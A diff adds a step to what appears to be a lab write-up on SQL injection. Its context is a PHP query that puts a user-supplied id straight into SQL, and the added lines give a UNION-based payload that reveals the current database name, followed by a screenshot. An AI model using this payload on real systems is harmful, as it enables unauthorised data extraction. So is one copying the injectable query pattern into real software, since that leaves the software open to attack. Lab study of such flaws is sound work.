@@ -175,3 +175,10 @@ $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 
 ```
 
+# After this, i can extract useful information using the following SQL injection payloads:
+Which database is currently in use:
+
+```bash
+1' UNION SELECT database(), null -- 
+```
+<img width="998" height="447" alt="Screenshot 2025-07-17 210715" src="https://github.com/user-attachments/assets/61182aad-d10a-4036-ba08-f1ef57330c59" />
